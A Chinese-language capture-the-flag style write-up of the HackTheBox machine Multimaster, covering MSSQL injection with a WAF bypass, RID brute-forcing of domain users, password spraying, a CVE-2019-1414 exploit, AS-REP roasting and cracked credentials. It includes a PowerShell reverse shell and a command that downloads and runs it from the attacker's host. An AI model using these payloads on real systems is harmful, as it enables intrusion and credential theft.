---
title: "HTB Multimaster"
description: "HackTheBox篇Active Directory 101系列之Multimaster"

date: 2024-07-23T14:31:07+08:00
lastmod: 2025-11-11T10:17:23+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - MSSQL
  - CVE-2019-1414
  - GenericWrite
  - Server Operators
  - SeBackupPrivilege
  - SeRestorePrivilege
---
<!--more-->

> 靶机ip：10.10.10.179

# 知识点

* MSSQL注入
* MSSQL注入枚举域用户
* CVE-2019-1414
* 滥用GenericWrite权限横向移动
* 滥用Server Operators组权限实现权限提升
* SeBackupPrivilege和SeRestorePrivilege权限的滥用

# 信息收集

## nmap扫描

`nmap -sS -sV -sC -p- 10.10.10.179`

```txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 15:15 CST
Nmap scan report for 10.10.10.179
Host is up (0.42s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 403 - Forbidden: Access is denied.
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-23 07:23:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-07-23T07:24:51+00:00; +7m01s from scanner time.
| rdp-ntlm-info:
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2024-07-23T07:24:12+00:00
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2024-07-22T07:10:19
|_Not valid after:  2025-01-21T07:10:19
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49783/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2024-07-23T00:24:13-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 1h31m00s, deviation: 3h07m51s, median: 7m00s
| smb2-time:
|   date: 2024-07-23T07:24:16
|_  start_date: 2024-07-23T07:10:28
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.27 seconds
```

发现有`DNS`服务、在`80`端口有`http`服务、`Kerberos`服务、`rpc`服务、`smb`服务、`ldap`服务以及`3389`端口的`rdp`服务，找到域名为`MEGACORP.LOCAL`，且主机为`Windows Server 2016`

## SMB

`smbclient -N -L //10.10.10.179`

![image-20240723153457969](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723153459937-1324338121.png)

没什么信息

## rpc

`rpcclient -U "" 10.10.10.179`

![image-20240723153806072](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723153807990-1882477100.png)

`rpc`不允许匿名访问

## ldap

`ldapsearch -H ldap://10.10.10.179:389 -x -b "DC=MEGACORP,DC=LOCAL"`

![image-20240723154218048](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723154220389-36524757.png)

`ldap`也失败了，可能是身份验证出现了问题

## http

在`80` 端口运行着一个`web`服务

![image-20240723154339541](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723154341955-174699650.png)

测试后发现几乎都点不了

![image-20240723155006560](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723155009137-1563602452.png)

在侧边栏点击`Colleague Finder`后，会有一个搜索框，什么数据都不输点击回车会显示一些人名等信息，仅此而已

将用户保存下来，可能后面能用到

```txt
sbauer@megacorp.htb
okent@megacorp.htb
ckane@megacorp.htb
kpage@megacorp.htb
shayna@megacorp.htb
james@megacorp.htb
cyork@megacorp.htb
rmartin@megacorp.htb
zac@magacorp.htb
jorden@megacorp.htb
alyx@megacorp.htb
ilee@megacorp.htb
nbourne@megacorp.htb
zpowers@megacorp.htb
zpowers@megacorp.htb
minato@megacorp.htb
egre55@megacorp.htb
```

在尝试拿`gobuster`扫描一下，看看是否有其他信息

`gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40`

![image-20240723164045428](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723164047789-118911268.png)

结果发现有巨多的403，不太符合正常情况，猜测有waf存在

这种搜索等功能可能会存在`sql`注入之类的洞，拿`burpsuit`抓个包看看

![image-20240723161655843](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723161658318-1989998677.png)

参数为`'`试试

![image-20240723185008069](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723185010410-55567549.png)

发现会报错，说明存在过滤，但是没有什么`waf`信息，尝试`fuzz`一下

`wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8' -t 1 --hc 200`

![image-20240723200247938](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723200250049-1678420648.png)

发现返回包中设置的字符编码是`utf-8`，尝试一下其他编码能否绕过

![image-20240723201454802](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723201457071-400479735.png)

测试后发现将`'`按照`unicode`编码后发现可以正常查询。绕过成功

# MSSQL注入

## sqlmap获取数据

通过`unicode`编码可以绕过`waf`，就能正常注入了，这里直接拿`sqlmap`跑一下

`python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch`

> `--tamper=charunicodeescape`：将payload中的所有字符进行unicode编码
>
> `--delay 5`： 延迟时间为5s，避免请求次数太快被ban
>
> `--level 5 --risk 3`：使用更全面更复杂的payload
>
> `--batch`：自动接受所有提示

![image-20240724141634076](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724141638815-1142390614.png)

从上述结果中可以发现，该数据库是`SQL Server`并且`sqlmap`成功执行，继续找数据库名

`python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -dbs`

![image-20240724142006540](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724142014523-1333297535.png)

先查看`Hub_DB`数据库看看有哪些表

`python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -tables`

![image-20240724143522636](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724143527309-1226900171.png)

有两个表，直接查看一下表中的值

* `Colleagues`

`python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Colleagues --dump`

![image-20240724143754224](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724143758776-409341571.png)

这是一张同事表，存储着每个人的信息

* `Logins`

`python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Logins --dump`

![image-20240724144015197](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724144019780-335466335.png)

发现是所有用户的用户名和密码，将用户名和密码保存到文件中，方便后续使用

* `users`

```txt
sbauer
okent
ckane
kpage
shayna
james
cyork
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
minatotw
egre55
```

* `passwords`

```txt
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
```

这时发现大多数密码都是一样的

## hashcat破解密码

先利用`john`尝试破解密码

![image-20240724154233559](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724154238265-1306385108.png)

发现并没有成功，尝试使用`hash-identifier`查看数据类型

![image-20240724154548438](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724154552885-955828641.png)

发现长度为384，测试后发现是`Keccak-384`

`hashcat -m 17900 passwords /usr/share/wordlists/rockyou.txt --force`

![image-20240724154754519](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724154759021-1055109536.png)

最后也是成功破解出三个密码，虽然数据库中有一堆用户，但是只有四个唯一的密码找到与其对应的用户名

| 用户名                                      | 密码      |
| ------------------------------------------- | --------- |
| sbauer, shayna, james, cyork, jorden, aldom | password1 |
| ckane, kpage, zac, ilee, zpowers            | finance1  |
| okent, rmartin, alyx, nbourne               | banking1  |
| minatotw, egre55                            | 未知      |

发现不知道密码的两个人身份是`CEO`，将密码重新保存至新的文件`passwds`

## 密码喷洒

将提取出来的密码保存下来，尝试使用`crackmapexec`进行密码喷洒

`crackmapexec smb 10.10.10.179 -u users -p passwords`

![image-20240724161241655](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724161246263-1891197988.png)

都失败了，只能寻找其他办法了，尝试寻找其他数据库中的信息，然而这些数据库中没有有用的信息

# MSSQL 注入枚举域用户名

## 攻击原理

> 通过网上搜索发现可以使用 RID 蛮力通过 MSSQL 注入来执行Active Directory枚举获取用户名
>
> 攻击原理：
>
> * 找出域名
> * 找出域的SID
> * 通过迭代一系列 RID 来确定每个对象的名称，从而构建用户、组和计算机 SID
>
> [参考链接](https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html)

> SQL Server中有一个函数叫做SUSER_SID()可以用来，它可以返回给定用户的安全标识号（SID），使用它来标识主域管理员的SID。
>
> 利用SQL注入枚举域内用户主要用到两个函数是SUSER_SID和SUSER_SNAME
>
> [SUSER_SID()函数说明](https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver16)
>
> [SUSER_SNAME()函数说明](https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql?view=sql-server-ver16)
>
> 先使用SUSER_SID函数拿到域的SID，之后使用SUSER_SNAME函数通过之前拿到的SID进行拼接RID进行枚举域用户名，之后在通过拿到的域用户名喷洒之前获得的凭据密码。

从之前`sqlmap`获取数据部分可以知道，字段数为5，回显位置是4

![image-20240724182307833](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724182312718-55166275.png)

这里借助`CyberChef`工具的`Escape Unicode Characters`模块，可以很方便的帮助我们进行编码

![image-20240724183219833](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724183224966-434528211.png)

![image-20240724182729157](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724182733745-1169710557.png)

可以看到，将`sqlmap`跑出来的`Payload`经过`unicode`编码后，利用`burpsuite`发送仍然有效，数据显示在阿`email`位置，接下来就可以继续操作了

## 获取默认域

第一步就是要获取域的名称，利用`default_domain()`函数获取域名

`a ' union select 1,2,3,(select default_domain()),5 --`

将`payload`编码后发送

![image-20240724184624729](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724184629285-1312604411.png)

可以获得域名`MEGACORP`

## 获取域的 SID

知道域名后，可以使用一致的内置账户或组（如：`Administrator`账户）注入获取`SID`值，在无类型转换的情况下会返回一个二进制数据，不利于我们读取，所以使用`sys.fn_varbintohexstr`将其包装起来，使其能够在`http`中直观地看出数据

> `sys.fn_varbintohexstr` 是 Microsoft SQL Server 中的一个系统函数。它用于将二进制数据转换为十六进制字符串表示

`a ' union select 1,2,3,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),5 --`

将`payload`编码后发送

![image-20240724185429811](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724185434633-319141801.png)

这里就拿到了SID`的十六进制：`0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`

但是我们需要将这个16进制数据转换成`SID`格式，这里利用`python`脚本实现

```python
def hex_to_sid(hex_str):
    # 去掉前缀 "0x" 和可能的空格
    hex_str = hex_str.replace("0x", "").replace(" ", "")

    # 将十六进制字符串转换为字节数组
    byte_array = bytearray.fromhex(hex_str)

    # 获取第一个字节，它表示版本号
    revision = byte_array[0]

    # 第二个字节表示标识符权限值的长度
    sub_authority_count = byte_array[1]

    # 接下来是6个字节的标识符权限值
    identifier_authority = int.from_bytes(byte_array[2:8], byteorder='big')

    # 剩下的字节是子授权值
    sub_authorities = []
    for i in range(sub_authority_count):
        sub_authority = int.from_bytes(byte_array[8 + i*4: 12 + i*4], byteorder='little')
        sub_authorities.append(sub_authority)

    # 组装SID字符串
    sid = f"S-{revision}-{identifier_authority}"
    for sub_authority in sub_authorities:
        sid += f"-{sub_authority}"
    return sid

hex_str = "0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000"
sid = hex_to_sid(hex_str)
print(f"SID: {sid}")
```

![image-20240724190057434](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724190101967-1037261460.png)

最后就获得了`SID`：`S-1-5-21-3167813660-1240564177-918740779-500`

## 枚举用户RID

上一步获取了`Administertor`的`SID`，可以利用之前提到过的`SUSER_SNAME()`函数验证一下

`a ' union select 1,2,3,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)),5 --`

![image-20240724190858542](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724190903604-191476298.png)

验证没问题，并且知道`Administertor`的`RID`是`500`

接下来就可以通过这个`RID`的值来爆破其他域用户名，这里使用`python`脚本来实现，但是要注意不要请求的太快，请求太快会被`waf`拦截，用`sleep`函数来达到延时访问的效果

```python
import requests
import json
import time

# SID转16进制
def sid_to_hex(sid_str):
    parts = sid_str[2:].split('-')
    revision = int(parts[0])
    identifier_authority = int(parts[1])
    sub_authorities = [int(part) for part in parts[2:]]
    hex_bytes = bytearray([revision, len(sub_authorities)])
    hex_bytes.extend(identifier_authority.to_bytes(6, byteorder='big'))
    for sub_authority in sub_authorities:
        hex_bytes.extend(sub_authority.to_bytes(4, byteorder='little'))
    return "0x" + hex_bytes.hex()
# 编码
def unicode_escape(s):
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])

headers={'Content-Type': 'application/json;charset=UTF-8'}
url = "http://10.10.10.179/api/getColleagues"
sql = "a' union select 1,2,3,(select SUSER_SNAME({})),5 --"

for i in range(500,10000):
    sid = "S-1-5-21-3167813660-1240564177-918740779-{}".format(i)
    str = sid_to_hex(sid)
    payload = '{"name":"'+unicode_escape(sql.format(str))+'"}'
    r = requests.post(url, data=payload, headers=headers)
    if json.loads(r.text)[0]['email'] :
        print(json.loads(r.text)[0]['email'])
    time.sleep(2)
```

运行上述脚本等待一会儿，就可以得到该域内几乎全部的用户名，将用户名保存到文件`users.txt`中，顺便把`MEGACORP\`过滤掉

```txt
Administrator
Guest
krbtgt
DefaultAccount
Domain Admins
Domain Users
Domain Guests
Domain Computers
Domain Controllers
Cert Publishers
Schema Admins
Enterprise Admins
Group Policy Creator Owners
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
RAS and IAS Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
MULTIMASTER$
DnsAdmins
DnsUpdateProxy
svc-nas
Privileged IT Accounts
tushikikatomo
andrew
lana
alice
test
dai
svc-sql
SQLServer2005SQLBrowserUser$MULTIMASTER
sbauer
okent
ckane
kpage
james
cyork
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
jsmmons
pmartin
Developers
```

## 二次密码喷洒登录tushikikatomo

用刚得到的用户名以及密码进行密码喷洒

`crackmapexec smb 10.10.10.179 -u users.txt -p passwds`

![image-20240724212700281](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724212704923-13932621.png)

最后也是在漫长的等待中，找到了正确的用户名和密码，在查看一下能否`winrm`登录

`crackmapexec winrm 10.10.10.179 -u tushikikatomo -p finance1`

![image-20240724212832989](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724212837921-732608447.png)

可以登录，直接登录该用户

`evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1`

![image-20240724213106549](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724213111085-1525432495.png)

登陆成功

![image-20240724213150692](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724213155442-1793569265.png)

最后在`Desktop`目录下找到`user.txt`

# 横向移动

## bloodhound信息搜集

先使用`bloodhound`进行信息搜集，看看能不能有有价值的信息

![image-20240725102923819](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240725102932070-1881559902.png)

发现还有很多其他用户，但是没找到什么其他信息

还是去翻翻文件夹吧

也是翻了好久，最后在`Program Files`文件夹中，发现一堆应用

![image-20240725111210668](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240725111221575-575415943.png)

再看下进程看看那些应用在运行

![image-20240725112455699](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240725112503342-1413852341.png)

发现在最上面运行着一堆`Code`进程，猜测跟`VSCode`应用有关，确认一下

![image-20240726103345887](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240726103348474-1758824233.png)

发现确实是该应用，看看该应用的版本

![image-20240726104229382](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240726104232227-713737.png)

在`C:\Program Files\Microsoft VS Code\resources\app`目录下找到`package.json`

在网上搜索该版本是否有漏洞，发现如下结果

* [CVE-2019-1414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414)

## CVE-2019-1414登录cyork

> 当 Visual Studio Code 向本地计算机的用户公开调试侦听器时，它会存在特权提升漏洞。成功利用此漏洞的本地攻击者可以注入任意代码以在当前用户的上下文中运行。如果当前用户使用管理用户权限登录，则攻击者可以控制受影响的系统。
> [详细利用方法](https://iwantmore.pizza/posts/cve-2019-1414.html)

使用工具[cefdebug](https://github.com/taviso/cefdebug)可以利用这个漏洞

先将工具下载到本地，再将`cefdebug.exe`传到机器上

![image-20240729093308415](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093323214-1165219866.png)

运行该文件

![image-20240729093341288](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093355745-1571258238.png)

扫描本地机器并成功获得了三个 `CEF` 调试器，随便找一个通过代码来验证

```sh
./cefdebug.exe --url ws://127.0.0.1:22048/43667936-2666-4f67-898b-5d4a75cd2f4a --code "process.version" 
```

![image-20240729093401071](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093416362-1657600438.png)

验证成功，发现可以执行命令，接下来就可以利用这个获取一个`shell`

拿下面的`powershell`命令反弹`shell`，先将该命令保存为`shell.ps1`至本地

```powershell
$ip = "10.10.14.3"
$port = 8888
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$buffer = New-Object byte[] 1024
$writer.WriteLine("Shell connected!")
$writer.Flush()
while (($input = $reader.ReadLine()) -ne "exit") {
    $output = (Invoke-Expression $input 2>&1 | Out-String)
    $writer.WriteLine($output)
    $writer.Flush()
}
$client.Close()
```

在`kali`开启监听，同时开启`http`服务

```sh
nc -lvp 8888
python3 -m http.server 80
```

最后使用`cefdebug.exe`运行 `CEF` 调试器的服务器执行反弹 `shell`

```powershell
.\cefdebug.exe --url ws://127.0.0.1:22048/43667936-2666-4f67-898b-5d4a75cd2f4a --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.3/shell.ps1\')')"
```

该命令将文件下载并执行而不是将文件传到机器上并执行，这样就绕过了本地的脚本执行策略

![image-20240729093432988](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093447413-368288370.png)

![image-20240729093506601](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093520842-1996459293.png)

![image-20240729093453671](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729093507850-881670073.png)

这时我们就拿到了`cyork`用户的权限

## SMB传输敏感文件

测试后发现`cyork`用户可以访问 `C:\inetpub\wwwroot\bin`目录，之前的用户访问是不行的

在这里发现了一些`dll`文件

![image-20240729094436832](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729094451423-1978565072.png)

这里注意到有一个名为`MultimasterAPI.dll`的`DLL` 

尝试利用`SMB`共享将文件下载下来

首先使用 `smbserver.py`建立一个共享服务器

`python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./`

![image-20240729100513542](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729100527970-1961370175.png)

在靶机上执行

```sh
net use x: \\10.10.14.3\share
copy MultimasterAPI.dll x:
```

![image-20240729104048727](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729104103094-1081529091.png)

![image-20240729104143310](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729104200842-1329366775.png)

![image-20240729104203181](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729104217347-1563767963.png)

此时发现已经将文件下载到本地了

## 逆向分析dll文件获取密码

分析一下是什么文件 

![image-20240729105631937](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729105646125-1589069605.png)

发现是`.NET`文件，用`dnSpy`工具分析

[dnSpy](https://github.com/dnSpy/dnSpy/releases)

![image-20240729110231243](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729110245688-624518175.png)

最后发现密码`D3veL0pM3nT!`

## 三次密码喷洒登录sbauer

熟悉的密码，熟悉的用户名列表，再次进行密码喷洒。这次的用户名列表和第一次的一样

`crackmapexec smb 10.10.10.179 -u users -p D3veL0pM3nT!`

![image-20240729111442645](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729111508437-1929996575.png)

再验证一下可不可以登录

`crackmapexec winrm 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'`

![image-20240729112311645](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729112326611-1209904571.png)

可以远程登录，直接登录

`evil-winrm -i 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'`

![image-20240729112710433](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729112737022-1061168092.png)

登录成功，但是发现没什么可以直接利用能够提权的权限

![image-20240729135821896](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729135847596-1147621995.png)

## bloodhound二次信息搜集

现在我们已经拿下了三个用户，分别是`tushikikatomo`、`cyork`、`sbauer`

在`bloodhound`中将他们标记为已经拿下的用户，然后点击`Shortest Paths to High Value Targets`

![image-20240729114739900](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729114754648-851746975.png)

看着就好复杂，但是仔细看会发现很多重要的信息

![image-20240729114935752](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240729114950277-1415659020.png)

![image-20240730173454585](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730173507194-1884458758.png)

仔细看会发现`sbauer`用户和`jorden`用户有`GenericWrite`关系，并且`jorden`用户属于`SERVER_OPERATORS`组（高权限组），我们可以试试能否通过滥用`GenericWrite`权限实现横向移动

## 滥用GenericWrite权限横移登录jorden

> 先看看之前提到的 AS-REP roasting攻击，该攻击允许为选择了“不需要 Kerberos 预身份验证”属性的用户破解密码哈希的技术。事实上，如果用户没有启用 Kerberos 预身份验证，我们可以为该用户请求 AS-REP，并且可以离线破解从而尝试恢复其明文密码。而这里SBAUER用户对JORDEN用户具有通用写权限，那么我们可以为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性，从而尝试使用AS-REP roasting攻击获取其明文密码。

可以使用下面这条命令来为`jorden`用户设置“不需要 `Kerberos` 预身份验证”的属性

```powershell
Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
```

![image-20240730173951299](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730173952758-9402141.png)

使用`impactet`下的`GetNPUsers`脚本来获取`jorden`用户的`AS-REP`票据

`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179`

![image-20240730174414913](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730174416438-495478340.png)

这样就获取到了`AS-REP`票据，将上述票据保存至文件`hash`中

```hash
$krb5asrep$23$jorden@MEGACORP.LOCAL:6127c87770a9aed57005d987e2818bd2$b6a67b254f3670033f7f32d0da0a98deae8f8dbbbd71917d7e27b9ef57ff4a394af9046f1a7673137568f7572276cfaad5af44c4def95bdadeaca1dbbe31fce3c9414823286c8a8a350b7bddce823eb93d4289a49d1e8dae1654ee01cc64d744a088c9723bc5183c0a8d0128b9b394973cbdf7051400953c5e9c6250c191c020ad1bb13615a6a60f02539b169280384e47f5049f8ccc8f9c882918c7d740044118ef07d521344784d8717fb6f6223bdffd341d7334e50e184dfb3c390913381725c7bec1a212fa0a148287bebe6cac9c114974b08bc658c3acfc61ad18ade1bc1d9419790395ef5b16edc5e2145e11d0
```

使用`john`尝试破解获取明文密码

`john hash -w=/usr/share/wordlists/rockyou.txt`

`john hash -w=/usr/share/wordlists/rockyou.txt`

![image-20240730174800662](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730174813435-1439858535.png)

得到`jorden`用户的明文密码：`rainforest786`

利用`crackmapexec`验证是否能够远程登录

`crackmapexec winrm 10.10.10.179 -u jorden -p 'rainforest786'`

![image-20240730175138971](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240730175140880-587706820.png)

可以登录，直接利用`evil-winrm`登录

`evil-winrm -i 10.10.10.179 -u jorden -p 'rainforest786'`

